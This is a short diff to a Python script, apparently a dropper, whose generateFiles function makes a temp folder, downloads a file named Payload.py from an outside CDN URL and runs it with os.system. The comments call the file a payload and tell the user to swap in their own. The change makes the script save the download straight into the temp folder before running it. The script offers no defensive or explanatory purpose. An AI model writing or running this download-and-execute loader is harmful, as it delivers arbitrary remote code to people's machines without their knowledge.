@@ -17,6 +17,8 @@ def generateFiles(): # Generate / Download the file.
 
     os.mkdir(full_path) # Create path.
     
+    os.chdir(full_path) # Goes to Temp Folder DIR.
+    
     file_url = "https://gitcdn.link/cdn/NightTabGit/PyTemp-1/main/Payload.py" # Replace with your own file.
     filename = file_url.split("/")[-1]
     r = requests.get(file_url, stream = True)
@@ -27,9 +29,6 @@ def generateFiles(): # Generate / Download the file.
     else:
         pass
     
-    shutil.copy("Payload.py", full_path) # Copys file: Local -> Temp Folder.
-    os.remove("Payload.py") # Removes file (Locally).
-    os.chdir(full_path) # Goes to Temp Folder DIR.
     os.system('Payload.py') # Runs new Payload.
 
 generateFiles() # Execute.
